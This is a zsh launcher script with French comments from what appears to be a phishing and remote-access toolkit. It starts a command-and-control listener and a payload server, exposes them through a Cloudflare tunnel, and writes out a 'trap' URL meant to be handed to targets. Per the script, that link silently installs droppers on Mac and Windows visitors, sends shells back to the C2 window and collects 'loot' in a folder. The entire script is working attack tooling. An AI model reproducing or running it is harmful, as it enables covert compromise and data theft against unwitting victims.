#!/bin/zsh
# 1-ENVOYER.command - double-clique : tout le piege part d'ici
# - ouvre 2 fenetres Terminal (c2 + serveur)
# - genere les droppers mac + windows avec ton IP
# - ecrit l'URL du piege dans 2-PIEGE-URL.txt
cd "$(dirname "$0")"

osascript -e 'tell application "Terminal" to do script "cd '"$(pwd)"' && ./delivery/c2.sh"' 2>/dev/null
osascript -e 'tell application "Terminal" to do script "cd '"$(pwd)"' && RICK_NAME=portal RICK_PORT=8080 ./delivery/serve.sh"' 2>/dev/null

sleep 6
LAN=$(grep -o "page piegee.*: http://[^ ]*" /tmp/rick_serve.log 2>/dev/null | grep -o "http://[^ ]*" | head -1)
PUB=$(grep -o "https://[a-z0-9-]*\.trycloudflare\.com" /tmp/rick_tunnel.log 2>/dev/null | head -1)
cat > "2-PIEGE-URL.txt" <<EOF
==========================================
   LE PIEGE - URL A DONNER AUX CIBLES
==========================================

URL publique (tout reseau) :
  ${PUB:-[relance cloudflared - voir README]}

URL reseau local :
  ${LAN:-http://127.0.0.1:8080/}

Le lien trie automatiquement :
  Mac     -> portal.command   (install muette)
  Windows -> portal_win.vbs   (install muette, zero fenetre)
  Mobile  -> message informatif

Les shells arrivent dans la fenetre c2 qui vient de s'ouvrir.
Le butin s'accumule dans le dossier Reception/ (bouton 3).
EOF
open "2-PIEGE-URL.txt"
open "Reception"
exit 0
